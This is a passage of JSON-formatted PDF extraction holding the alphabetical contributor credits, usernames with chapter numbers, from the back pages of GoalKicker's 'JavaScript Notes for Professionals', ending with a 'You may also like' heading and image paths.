        "text": "Chapter 19 Chris Chapters 10 and 22 Christian Chapter 2 Christian Landgren Chapter 13 Christoph Chapter 1 Christophe Marois Chapter 42 Christopher Ronning Chapter 27 Claudiu Chapters 7 and 42 Cli\ufb00 Burton Chapters 13 and 19 Code Uniquely Chapter 18 codemano Chapter 12 code_monk Chapter 12 CodingIntrigue Chapters 7, 12, 13, 50, 57 and 69 Colin Chapter 10 cone56 Chapter 92 Conlin Durbin Chapter 27 CPHPython Chapters 5, 12, 19, 50, 56 and 62 Creative John Chapter 24 CroMagnon Chapters 27 and 48 csander Chapters 6, 8, 18, 38, 43, 56 and 85 cswl Chapters 15 and 81 Daksh Gupta Chapters 1 and 62 Damon Chapters 11, 12, 19 and 62 Dan Pantry Chapter 42 Daniel Chapter 12 Daniel Herr Chapters 11, 12, 18, 30, 35, 41, 42 and 55 Daniel LIn Chapter 79 daniellmb Chapters 1 and 42 daniphilia Chapter 102 DarkKnight Chapters 19 and 60 dauruy Chapter 12 Dave Sag Chapters 42 and 100 David Archibald Chapter 1 David G. Chapters 1 and 42 David Knipe Chapter 56 Davis Chapters 14, 19, 59 and 62 DawnPaladin Chapters 5, 59 and 99 Deepak Bansal Chapter 99 Denys S\u00e9guret Chapter 104 Derek  \u6715\u6703\u529f\u592b Chapter 35 DevDig Chapter 62 Devid Farinelli Chapters 1 and 99 devlin carnate Chapter 42 Diego Molina Chapter 59 dns_nx Chapter 12 Domenic Chapters 12 and 49 DontVoteMeDown Chapter 1 Downgoat Chapters 73 and 96 Dr. Cool Chapter 90 Dr. J. Testington Chapter 12 Drew Chapter 14 dunnza Chapter 42 Durgpal Singh Chapters 19 and 42",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 466",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "DVJex Chapter 99 DzinX Chapter 12 Ehsan Sajjad Chapter 99 Eirik Birkeland Chapter 19 Ekin Chapters 37 and 67 eltonkamami Chapters 18, 19, 31, 62 and 99 Emissary Chapters 5, 17, 104 and 106 Emre Bolat Chapter 106 Erik Minarini Chapter 42 Ethan Chapter 62 et_l Chapters 13 and 65 Evan Bechtol Chapter 42 Everettss Chapters 1, 19 and 57 Explosion Pills Chapter 81 Fab313 Chapter 22 fracz Chapters 12 and 42 Frank Tan Chapter 60 FrankCamara Chapter 12 FredMaggiowski Chapter 13 fson Chapters 42 and 81 Gabriel Furstenheim Chapter 41 Gabriel L. Chapter 42 Gaurang Tandon Chapter 14 Gavishiddappa Gadagi Chapter 19 gca Chapter 10 gcampbell Chapter 7 geekonaut Chapters 61, 63 and 89 georg Chapter 42 George Bailey Chapters 12, 13, 30 and 90 GingerPlusPlus Chapter 99 gman Chapters 1, 5 and 29 gnerkus Chapter 11 GOTO 0 Chapters 7, 67 and 78 Grundy Chapter 10 Guybrush Threepwood Chapter 22 H. Pauwelyn Chapters 1 and 65 hairboat Chapter 19 Hans Strausl Chapters 3 and 12 hansmaad Chapter 12 Hardik Kanjariya  \u30c4 Chapters 12, 14, 46 and 47 harish gadiya Chapter 104 haykam Chapters 1, 5, 7 and 101 Hayko Koryun Chapter 14 HC_ Chapter 64 HDT Chapter 43 Hendry Chapter 91 Henrique Barcelos Chapters 42 and 56 Hi I'm Frogatto Chapter 7 hiby Chapter 33 hindmost Chapters 14 and 29 hirnwunde Chapter 5 hirse Chapter 36 HopeNick Chapters 15 and 85",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 467",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hunan Rostomyan Chapter 12 I am always right Chapter 83 Iain Ballard Chapter 50 Ian Chapters 10, 19 and 35 iBelieve Chapters 55 and 57 Igor Raush Chapters 10, 41, 42, 57 and 62 Inanc Gumus Chapters 1, 5 and 81 inetphantom Chapter 1 Ishmael Smyrnow Chapter 12 Isti115 Chapter 12 iulian Chapter 15 Ivan Chapter 36 ivarni Chapter 22 J F Chapters 14, 58, 59, 89 and 90 jabacchetta Chapter 62 James Donnelly Chapter 32 James Long Chapter 12 Jamie Chapter 10 Jan Pokorn\u00fd Chapter 13 Jason Park Chapter 12 Jay Chapters 19 and 22 JBCP Chapters 3 and 42 jbmartinez Chapter 19 jchavannes Chapter 30 jchitel Chapter 42 JCOC611 Chapter 40 JDB Chapter 19 Jean Louren\u00e7o Chapter 19 Jef Chapter 106 Jeremy Banks Chapters 1, 10, 12, 13, 14, 19, 22, 27, 33, 35, 36, 50, 51, 53, 54, 55, 62, 71, 94 and 97 Jeremy J Starcher Chapter 12 Jeroen Chapters 1 and 11 JimmyLv Chapter 81 Jinw Chapter 79 jisoo Chapter 12 jitendra varshney Chapter 1 Jivings Chapters 10, 35, 50 and 55 jkdev Chapters 3, 10, 12, 18, 30, 35, 36, 39 and 56 JKillian Chapter 31 jmattheis Chapter 1 John Chapter 13 John Archer Chapter 99 John C Chapter 8 John Oksasoglu Chapter 28 John Slegers Chapters 1, 8, 12, 35, 42, 53 and 62 John Syrinek Chapters 29 and 68 Jonas W. Chapter 13 Jonathan Lam Chapters 1, 7, 29 and 45 Jonathan Walters Chapters 18, 27 and 31 Joseph Chapters 19 and 42 Joshua Kleveter Chapters 1 and 25 Junbang Huang Chapter 76",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 468",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Just a student Chapters 5 and 74 K48 Chapters 1, 9, 10, 33, 42 and 99 kamoroso94 Chapters 8, 14, 19 and 64 kanaka Chapter 61 kapantzak Chapters 20 and 62 Karuppiah Chapter 1 Kayce Basques Chapter 63 Keith Chapters 81 and 82 Kemi Chapter 69 kevguy Chapters 62 and 63 Kevin Katzke Chapter 10 Kevin Law Chapter 19 khawarPK Chapter 10 Kit Grose Chapter 54 Knu Chapters 10, 11, 13, 14, 18, 35, 36, 97 and 99 Kousha Chapter 10 Kyle Blake Chapters 10 and 12 L Bahr Chapters 10, 37, 66 and 102 leo.fcx Chapter 42 Li357 Chapter 106 Liam Chapter 17 Lisa Gagarina Chapter 65 LiShuaiyuan Chapter 35 Little Child Chapter 41 little pootis Chapter 1 Louis Barranqueiro Chapters 13, 35 and 65 Lu\u00eds Hendrix Chapters 10, 60 and 104 Luc125 Chapters 7 and 12 luisfarzati Chapter 42 M. Erraysy Chapter 12 Maciej Gurban Chapters 12 and 65 Madara Uchiha Chapters 19, 20, 59, 60, 81 and 82 maheeka Chapter 9 maioman Chapters 19 and 42 Marco Bonelli Chapters 3, 53 and 96 Marco Scabbiolo Chapters 3, 10, 13, 17, 20, 27, 30, 42, 46, 56, 57, 68, 69, 81 and 90 Marina K. Chapters 10 and 104 mark Chapters 19 and 56 Mark Schultheiss Chapters 5 and 99 mash Chapter 10 MasterBob Chapters 1, 19, 24, 25 and 81 Matas Vaitkevicius Chapters 1, 6 and 42 Mathias Bynens Chapter 1 Matt Lishman Chapter 57 Matt S Chapter 31 Mattew Whitt Chapter 42 Matthew Crumley Chapters 18, 67, 84 and 104 mauris Chapters 33 and 56 Max Alcala Chapters 12, 19, 41 and 56 Maximillian Laumeister Chapter 42 Md. Mahbubul Haque Chapter 13 MEGADEVOPS Chapter 1 MegaTom Chapter 11",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 469 Meow",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapters 7, 11, 14, 19, 59 and 62 metal03326 Chapters 92 and 99 Michal Pietraszko Chapter 17 Micha \u0142  Per \u0142 akowski Chapters 1, 35, 38, 43, 76, 77 and 81 Michiel Chapter 12 Mijago Chapter 97 Mike C Chapters 10, 11, 12, 13, 18, 19, 37, 57 and 65 Mike McCaughan Chapters 3, 8, 9, 12, 13, 15 and 42 Mikhail Chapters 5, 7, 12, 14, 33, 39, 45, 55 and 58 Mikki Chapter 97 Mimouni Chapters 1 and 12 miquelarranz Chapter 89 Mobiletainment Chapter 89 Mohamed El Chapter 55 monikapatel Chapter 5 Morteza Tourani Chapter 12 Motocarota Chapter 42 Mottie Chapters 10, 12, 14 and 18 murrayju Chapter 81 n4m31ess_c0d3r Chapter 10 Nachiketha Chapter 63 Naeem Shaikh Chapters 42 and 69 nalply Chapters 10 and 42 Naman Sancheti Chapters 1 and 50 nasoj1100 Chapter 12 Nathan Tuggy Chapter 7 naveen Chapter 65 ndugger Chapters 17, 19, 22 and 62 Neal Chapters 12, 13, 19, 22, 27, 36 and 62 Nelson Teixeira Chapter 12 nem035 Chapters 10, 12, 20, 60 and 65 nhahtdh Chapter 31 Nhan Chapters 12 and 35 ni8mr Chapters 10 and 18 nicael Chapters 11, 42, 44 and 99 Nicholas Monta\u00f1o Chapter 102 Nick Chapter 1 Nick Larsen Chapter 61 NickHTTPS Chapter 63 Nikita Kurtin Chapters 99 and 104 Nikola Lukic Chapters 58 and 101 Nina Scholz Chapters 12 and 40 Nisarg Chapter 66 npdoty Chapter 71 nseepana Chapter 104 Nuri Tasdemir Chapters 42 and 62 nus Chapter 19 nylki Chapter 1 Oriol Chapter 10 Ortomala Lokni Chapter 10 orvi Chapters 1 and 18 Oscar Jara Chapter 10 Ovidiu Dolha Chapter 93",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 470 Ozan",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 75 oztune Chapters 5, 18, 55 and 57 P.J.Meisch Chapter 62 PageYe Chapter 10 Pankaj Upadhyay Chapter 62 Parvez Rahaman Chapters 30 and 72 patrick96 Chapter 42 Paul S. Chapters 7, 10, 19, 27, 31 and 62 Pawel Dubiel Chapters 17 and 59 PedroSouki Chapters 23 and 65 pensan Chapter 14 Peter Bielak Chapter 94 Peter G Chapter 5 Peter LaBanca Chapter 1 Peter Olson Chapter 13 Peter Seliger Chapter 22 phaistonian Chapter 12 Phil Chapter 13 pietrovismara Chapter 89 Pinal Chapters 19, 42 and 55 pinjasaur Chapter 4 PitaJ Chapter 65 Pranav C Balan Chapter 12 programmer5000 Chapter 95 ProllyGeek Chapters 20, 65 and 79 pzp Chapters 8, 30 and 71 Qianyue Chapters 12, 60 and 62 QoP Chapters 12, 19, 22, 35, 42 and 57 Quartz Fog Chapters 31 and 54 Quill Chapters 7 and 42 Racil Hilan Chapter 34 Rafael Dantas Chapter 12 Rahul Arora Chapters 20 and 29 Rajaprabhu Aravindasamy  Chapter 13 Rajesh Chapter 10 Rakiti \u0107 Chapter 1 RamenChef Chapter 14 Randy Chapters 19 and 50 Raphael Schweikert Chapter 10 rfsbsb Chapter 67 richard Chapter 37 Richard Hamilton Chapters 7, 10, 12, 14, 31, 48 and 99 Richard Turner Chapter 62 riyaz Chapter 42 Roamer Chapter 42 Rohit Jindal Chapters 30 and 40 Rohit Kumar Chapter 57 Rohit Shelhalkar Chapter 5 Roko C. Buljan Chapters 4, 7, 12, 14, 33, 44, 45, 89 and 106 rolando Chapters 12, 13, 18 and 19 rolfedh Chapter 19 Ronen Ness Chapters 12, 19, 32 and 43 ronnyfm Chapter 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 471",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "royhowie Chapter 35 Ruhul Amin Chapter 41 rvighne Chapters 13, 19, 22, 45 and 88 Ry \ufffd Chapter 31 S Willis Chapter 8 sabithpocker Chapter 7 Sagar V Chapters 19, 29 and 61 Sammy I. Chapter 20 Sandro Chapter 12 SarathChandra Chapter 11 Saroj Sasmal Chapter 1 Scimonster Chapter 24 Sean Vieira Chapter 27 SeanKendle Chapter 1 SeinopSys Chapters 1 and 96 SEUH Chapter 61 SgtPooki Chapter 97 shaedrich Chapter 70 shaN Chapter 90 Shawn Chapter 60 Shog9 Chapters 19 and 59 Shrey Gupta Chapter 12 Sibeesh Venu Chapter 56 sielakos Chapters 12, 19 and 50 Siguza Chapter 40 simonv Chapter 29 SirPython Chapter 5 smallmushroom Chapter 18 Spencer Wieczorek Chapters 7, 10, 15 and 65 spirit Chapter 35 splay Chapters 7, 10 and 40 Sreekanth Chapter 89 ssc Chapter 1 stackover\ufb02oweth Chapter 13 Stephen Leppik Chapter 40 Steve Greatrex Chapter 42 Stewartside Chapter 14 Stides Chapter 60 still_learning Chapters 14 and 94 sty\ufb02e Chapter 20 sudo bangbang Chapter 42 Sumit Chapter 11 Sumner Evans Chapters 99 and 102 Sumurai8 Chapters 8, 10, 13, 14, 17, 35 and 56 Sunny R Gupta Chapter 56 svarog Chapters 7, 17, 43, 80 and 90 Sverri M. Olsen Chapter 1 SZenC Chapters 1, 10, 11, 13, 14, 18, 19, 30, 31, 32, 36, 59, 62, 80 and 97 Tacticus Chapter 96 tandrewnichols Chapter 19 Tanmay Nehete Chapter 19 Taras Lukavyi Chapter 59 tcooc Chapter 42",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 472",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "teppic Chapter 42 Thomas Leduc Chapter 31 Thriggle Chapters 1 and 19 Ties Chapter 74 ti\ufb00on Chapter 101 Tim Chapter 30 Tim Rijavec Chapter 86 Tiny Giant Chapter 36 tjfwalker Chapter 11 tnga Chapter 1 Tolen Chapter 1 Tom\u00e1s Ca\u00f1ibano Chapters 7 and 59 Tomboyo Chapter 17 tomturton Chapter 65 ton Chapter 56 Tot Zam Chapter 36 towerofnix Chapter 38 transistor09 Chapter 33 Traveling Tech Guy Chapter 12 Travis Acton Chapter 1 Trevor Clarke Chapters 8, 14 and 46 trincot Chapters 19 and 35 Tschallacka Chapter 65 Tushar Chapters 1 and 31 user2314737 Chapters 8, 12, 14, 19, 35, 50, 59 and 104 user3882768 Chapter 11 Vaclav Chapter 12 VahagnNikoghosian Chapters 12 and 104 Vasiliy Levykin Chapters 3, 10 and 19 Ven Chapters 1, 10 and 42 Victor Bjelkholm Chapter 5 VisioN Chapters 12 and 52 Vlad Nicula Chapter 62 Vladimir Gabrielyan Chapter 42 wackozacko Chapters 42 and 60 WebBrother Chapter 65 whales Chapters 8 and 18 Will Chapter 62 Wladimir Palant Chapters 5, 10, 42 and 62 Wolfgang Chapter 30 wuxiandiejia Chapters 7, 12 and 43 XavCo7 Chapters 1, 11, 12, 13, 18, 40, 50, 63, 64, 71, 90 and 92 xims Chapter 1 YakovL Chapter 56 ymz Chapter 19 Yosvel Quintero Chapters 1, 5, 12, 13, 14, 17, 22, 34, 35, 42 and 104 Yumiko Chapter 33 Yury Fedorov Chapters 1 and 42 Zack Harley Chapter 56 Zaga Chapter 31 Zaz Chapter 42 zb' Chapter 42 zer00ne Chapter 12",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 473",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ZeroBased_IX Chapter 12 Zhegan Chapter 35 zhirzh Chapters 12, 14 and 19 Zirak Chapter 56 Zoltan.Tamasi Chapter 42 zur4ik Chapters 19 and 62 zurfyx Chapter 70 Zze Chapter 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You may also like",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": [
            "output_directory\\image_490_1.png",
            "output_directory\\image_490_2.png",
            "output_directory\\image_490_3.png",
            "output_directory\\image_490_4.png",
            "output_directory\\image_490_5.png",
            "output_directory\\image_490_6.png",
            "output_directory\\image_490_7.png",
            "output_directory\\image_490_8.png",
            "output_directory\\image_490_9.png"
        ]
    }
]